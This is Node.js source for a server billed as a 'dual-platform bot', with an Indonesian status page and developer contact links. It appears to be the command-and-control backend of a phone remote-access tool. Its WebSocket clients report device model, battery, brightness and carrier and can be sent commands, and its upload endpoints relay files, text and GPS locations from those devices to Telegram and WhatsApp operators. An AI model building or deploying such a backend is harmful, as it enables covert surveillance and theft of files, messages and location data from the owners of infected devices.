/**
 * Main server file for dual-platform bot (Telegram + WhatsApp)
 * Modified for Replit compatibility
 */

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const uuid4 = require('uuid');
const fs = require('fs');
const path = require('path');

// Import configuration and utilities
const config = require('./config');
const utils = require('./utils');

// Import bot handlers
const TelegramBotHandler = require('./telegramBot');
const WhatsAppBotHandler = require('./whatsappBot');

// Initialize Express app and server
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});

// Configure middleware
const upload = multer();
app.use(bodyParser.json());

// Shared state between platforms
const sharedState = {
  clients: new Map(),
  currentUuid: '',
  currentNumber: '',
  currentTitle: '',
  
  // Method to send message to a specific device
  sendToDevice: (uuid, message) => {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid === uuid) {
        ws.send(message);
      }
    });
  }
};

// Initialize bot handlers
const telegramBot = new TelegramBotHandler(sharedState);
const whatsappBot = new WhatsAppBotHandler(sharedState);

// Server homepage
app.get('/', function (req, res) {
  res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Server Online</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Poppins', sans-serif;
            }
            body {
                background: linear-gradient(to right, #111, #222);
                color: white;
                text-align: center;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                flex-direction: column;
            }
            .container {
                background: rgba(255, 255, 255, 0.1);
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
                width: 90%;
                max-width: 400px;
                text-align: center;
            }
            h1 {
                font-size: 24px;
                margin-bottom: 10px;
                animation: fadeIn 1.5s ease-in-out;
            }
            .status {
                font-size: 20px;
                font-weight: bold;
                color: #25d366;
                margin: 10px 0;
                animation: blink 1s infinite alternate;
            }
            .platform-info {
                margin: 15px 0;
                font-size: 16px;
            }
            .replit-info {
                margin: 15px 0;
                font-size: 14px;
                color: #ffcc00;
            }
            .whatsapp-btn {
                display: inline-block;
                background: #25d366;
                color: white;
                padding: 12px 20px;
                font-size: 18px;
                font-weight: bold;
                text-decoration: none;
                border-radius: 5px;
                margin-top: 20px;
                transition: 0.3s;
                animation: fadeIn 2s ease-in-out;
            }
            .telegram-btn {
                display: inline-block;
                background: #0088cc;
                color: white;
                padding: 12px 20px;
                font-size: 18px;
                font-weight: bold;
                text-decoration: none;
                border-radius: 5px;
                margin-top: 10px;
                margin-right: 10px;
                transition: 0.3s;
                animation: fadeIn 2s ease-in-out;
            }
            .whatsapp-btn:hover, .telegram-btn:hover {
                opacity: 0.8;
                transform: scale(1.05);
            }
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Dual-Platform Bot Server 🎉</h1>
            <p class="status">🟢 Status: Online</p>
            <div class="platform-info">
                <p>✅ Telegram Bot: Aktif</p>
                <p>⚠️ WhatsApp Bot: Mode Kompatibilitas Replit</p>
            </div>
            <div class="replit-info">
                <p>Bot berjalan dalam mode kompatibilitas Replit.</p>
                <p>Fitur Telegram berfungsi penuh, WhatsApp terbatas.</p>
            </div>
            <p>Terimakasih telah menggunakan server kami!</p>
            <div>
                <a href="https://t.me/SisuryaOfficial" class="telegram-btn">Telegram</a>
                <a href="https://wa.me/6281991123172?text=Halo%20Developer,%20saya%20butuh%20bantuan!" class="whatsapp-btn">WhatsApp</a>
            </div>
        </div>
    </body>
    </html>
  `);
});

// Handle file uploads
app.post("/uploadFile", upload.single('file'), (req, res) => {
  const file = {
    buffer: req.file.buffer,
    originalname: req.file.originalname
  };
  const source = req.headers.model || 'Unknown Device';
  
  // Send to both platforms
  utils.handleFileUpload(
    file, 
    source,
    (file, source) => telegramBot.sendDocument(file, source),
    (file, source) => whatsappBot.sendDocument(file, source)
  );
  
  res.send('');
});

// Handle text uploads
app.post("/uploadText", (req, res) => {
  let text = req.body['text'] || '';
  const source = req.headers.model || 'Unknown Device';
  
  // Send to both platforms
  utils.handleTextUpload(
    text,
    source,
    (text, source) => telegramBot.sendText(text, source),
    (text, source) => whatsappBot.sendText(text, source)
  );
  
  res.send('');
});

// Handle location uploads
app.post("/uploadLocation", (req, res) => {
  const location = {
    lat: req.body['lat'],
    lon: req.body['lon']
  };
  const source = req.headers.model || 'Unknown Device';
  
  // Send to both platforms
  utils.handleLocationUpload(
    location,
    source,
    (location, source) => telegramBot.sendLocation(location, source),
    (location, source) => whatsappBot.sendLocation(location, source)
  );
  
  res.send('');
});

// Handle WebSocket connections
appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const model = req.headers.model || 'Unknown';
  const battery = req.headers.battery || 'Unknown';
  const version = req.headers.version || 'Unknown';
  const brightness = req.headers.brightness || 'Unknown';
  const provider = req.headers.provider || 'Unknown';
  
  // Store connection and device info
  ws.uuid = uuid;
  sharedState.clients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    provider: provider
  });
  
  // Notify both platforms about new device
  telegramBot.notifyNewDevice(sharedState.clients.get(uuid));
  whatsappBot.notifyNewDevice(sharedState.clients.get(uuid));
  
  // Handle disconnection
  ws.on('close', function () {
    const deviceInfo = sharedState.clients.get(ws.uuid);
    if (deviceInfo) {
      telegramBot.notifyDeviceDisconnected(deviceInfo);
      whatsappBot.notifyDeviceDisconnected(deviceInfo);
      sharedState.clients.delete(ws.uuid);
    }
  });
});

// Keep server alive and ping clients
setInterval(function () {
  appSocket.clients.forEach(function each(ws) {
    ws.send('ping');
  });
  
  try {
    axios.get(config.address).then(r => "");
  } catch (e) {
    console.error('Error pinging server:', e);
  }
}, 5000);

// For Replit, we need to use the port provided by the environment
const PORT = process.env.PORT || config.port || 8999;

// Start server
appServer.listen(PORT, () => {
  console.log(`Dual-platform bot server running on port ${PORT}`);
  console.log('Telegram Bot: Active');
  console.log('WhatsApp Bot: Initializing in Replit compatibility mode...');
});
